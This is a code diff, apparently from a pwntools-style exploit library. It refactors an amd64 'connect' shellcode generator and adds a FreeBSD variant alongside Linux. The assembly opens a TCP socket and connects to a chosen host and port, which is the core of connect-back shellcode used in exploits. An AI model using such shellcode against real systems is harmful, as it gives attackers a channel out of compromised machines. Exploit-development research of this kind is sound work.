@@ -20,8 +20,7 @@ def connect(host, port, arch = None, os = None):
         elif os == 'freebsd':
             return _connect_freebsd_i386(host, port)
     elif arch == 'amd64':
-        if os == 'linux':
-            return _connect_linux_amd64(host, port)
+        return _connect_amd64(host, port, os)
     else:
         no_support('connect', os, arch)
 
@@ -97,25 +96,28 @@ def _connect_freebsd_i386(host, port):
        'port'    : htons(int(port))
        }
 
-def _connect_linux_amd64(host, port):
-    sock = pwn.asm('dw AF_INET, %d' % htons(port)) + p32(ip(host))
+def _connect_amd64(host, port, os):
+    if os == 'linux':
+        sock = pwn.asm('dw AF_INET, %d' % htons(port)) + p32(ip(host))
+    elif os == 'freebsd':
+        sock = pwn.asm('dw AF_INET << 8, %d' % htons(port)) + p32(ip(host))
 
     return '''
-push SYS64_socket
-pop rax
-push AF_INET
-pop rdi
-push SOCK_STREAM
-pop rsi
-cdq  ;; rdx = IPPROTO_IP (=0)
-syscall
-mov ebp, eax
+            push SYS64_socket
+            pop rax
+            push AF_INET
+            pop rdi
+            push SOCK_STREAM
+            pop rsi
+            cdq  ;; rdx = IPPROTO_IP (=0)
+            syscall
+            mov ebp, eax
 ''' + pushstr(sock, raw = True) + '''
-mov edi, ebp
-mov rsi, rsp
-push 16
-pop rdx
-push SYS64_connect
-pop rax
-syscall
+            mov edi, ebp
+            mov rsi, rsp
+            push 16
+            pop rdx
+            push SYS64_connect
+            pop rax
+            syscall
 '''
